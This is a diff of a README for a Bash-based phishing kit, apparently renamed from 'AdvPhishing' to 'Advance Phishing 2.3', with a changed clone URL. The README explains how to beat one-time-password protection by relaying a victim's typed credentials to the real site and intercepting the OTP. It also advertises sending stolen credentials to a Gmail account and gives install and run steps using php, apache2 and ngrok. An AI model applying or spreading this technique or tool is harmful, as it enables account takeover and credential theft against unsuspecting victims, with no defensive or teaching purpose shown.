@@ -29,8 +29,6 @@ Meet Me;
 ### TECHNIQUE
 When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.
 
-### TUTORIAL [ KALI ]
-[(![des](https://user-images.githubusercontent.com/55870659/77065337-7b7de000-69b7-11ea-915d-4dad81d2e892.png)](https://www.youtube.com/watch?v=U1nYsNLlFsw)
 
 ### SCREENSHOT ( KALI )
 ![1](https://user-images.githubusercontent.com/55870659/92330976-02e00e00-f041-11ea-9c32-bc33d2971b06.png)
@@ -40,7 +38,7 @@ When victim enter his credentials, you need to go to original website and use th
 <br>
 
 -----------------------------------------------------------------------------------------------------
-### WHAT's New In AdvPhishing 2.2 Release 
+### WHAT's New In Advance Phishing 2.3 Release 
 Through This Features You can Obtains the Credentails on Your Gmail Account or Send to Someone Else.
 <br>
 ### Process
@@ -64,8 +62,8 @@ Through This Features You can Obtains the Credentails on Your Gmail Account or S
 
 
 ### INSTALLATION [ KALI ]
-* git clone https://github.com/Ignitetch/AdvPhishing.git
-* cd AdvPhishing/
+* https://github.com/JHacker-JMusicology/Advance-Phishing.git
+* cd Advance-Phishing/
 * chmod 777 *
 * ./Linux-Setup.sh
 * ./AdvPhishing.sh
@@ -79,11 +77,13 @@ Through This Features You can Obtains the Credentails on Your Gmail Account or S
 * Ubuntu - 18.04 (version)
 * Arch Linux
 * Termux App
+
 ### PREREQUISITES
 * sudo - [ MUST ]
 * php
 * apache2
 * ngrok Token
+
 ### LANGUAGE 
 * Bash Script
 
